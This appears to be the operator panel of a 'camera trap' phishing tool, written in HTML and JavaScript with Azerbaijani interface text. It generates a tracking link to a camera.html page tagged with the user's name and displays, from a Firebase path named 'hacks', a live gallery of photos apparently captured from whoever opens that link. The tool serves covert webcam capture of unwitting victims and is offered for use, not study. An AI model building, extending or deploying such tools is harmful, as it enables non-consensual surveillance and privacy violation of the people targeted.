<div class="tool-container" style="animation: fadeIn 0.4s ease-out; color: white; padding: 10px;">
    <div style="text-align: center; margin-bottom: 25px;">
        <h2 style="color: #ff3e3e; margin: 0;"><i class="fas fa-camera"></i> Camera Trap Control</h2>
        <p style="font-size: 0.75rem; color: #888; margin-top: 5px;">Link yaradın və öz qalereyanızı izləyin.</p>
    </div>
    
    <div style="background: rgba(255, 62, 62, 0.05); border: 1px solid rgba(255, 62, 62, 0.2); padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 30px;">
        <div id="trap-url-display" style="font-family: monospace; font-size: 0.75rem; color: #ff3e3e; background: #000; padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #222; word-break: break-all;">
            Gözlənilir...
        </div>
        <button class="btn" style="background: #ff3e3e; color: white; margin: 0;" onclick="createTrapForMe()">
            <i class="fas fa-magic"></i> LİNKİ YARAT VE KOPYALA
        </button>
    </div>

    <div id="my-results">
        <h3 style="font-size: 0.9rem; color: #eee; border-left: 3px solid #ff3e3e; padding-left: 10px; margin-bottom: 15px;">
            Mənə Gələn Şəkillər
        </h3>
        <div id="personal-gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px;">
            <div id="wait-msg" style="grid-column: 1/-1; text-align: center; color: #444; padding: 30px; font-size: 0.8rem; border: 1px dashed #222; border-radius: 10px;">
                Şəkillər yüklənir və ya hələ yoxdur...
            </div>
        </div>
    </div>
</div>

<script>
    // Fail-safe: Əgər qlobal ad yoxdursa, ana səhifədən çəkməyə çalış
    function getSafeUsername() {
        return window.loginName || document.getElementById('u-name').innerText;
    }

    function createTrapForMe() {
        let uName = getSafeUsername();
        
        if (!uName || uName === "...") {
            alert("Xəta: İstifadəçi adı sistemdə tapılmadı. Yenidən giriş edin.");
            return;
        }

        let loc = window.location.href;
        let base = loc.substring(0, loc.lastIndexOf('/') + 1);
        let finalLink = base + "camera.html?ref=" + uName;

        document.getElementById('trap-url-display').innerText = finalLink;
        
        // Kopyalama
        navigator.clipboard.writeText(finalLink).then(() => {
            alert("Link kopyalandı: " + uName);
        });

        startTrackingMyPhotos(uName);
    }

    function startTrackingMyPhotos(uName) {
        const gallery = document.getElementById('personal-gallery');
        const waitMsg = document.getElementById('wait-msg');
        
        // Firebase bazasını tapmaq
        const database = window.db || firebase.database();

        database.ref('hacks/' + uName).on('value', (snapshot) => {
            if (snapshot.exists()) {
                waitMsg.style.display = 'none';
                gallery.innerHTML = ""; 
                snapshot.forEach((child) => {
                    const data = child.val();
                    const card = document.createElement('div');
                    card.style = "background: #0a0a0a; border: 1px solid #222; border-radius: 10px; overflow: hidden;";
                    card.innerHTML = `
                        <img src="${data.image}" style="width: 100%; height: 120px; object-fit: cover; display: block;" onclick="window.open(this.src)">
                        <div style="padding: 6px; font-size: 0.6rem; color: #666; text-align: center;">${data.date}</div>
                    `;
                    gallery.prepend(card);
                });
            }
        });
    }

    // Açılan kimi avtomatik izləməni başlat
    let autoName = getSafeUsername();
    if(autoName && autoName !== "...") {
        startTrackingMyPhotos(autoName);
    }
</script>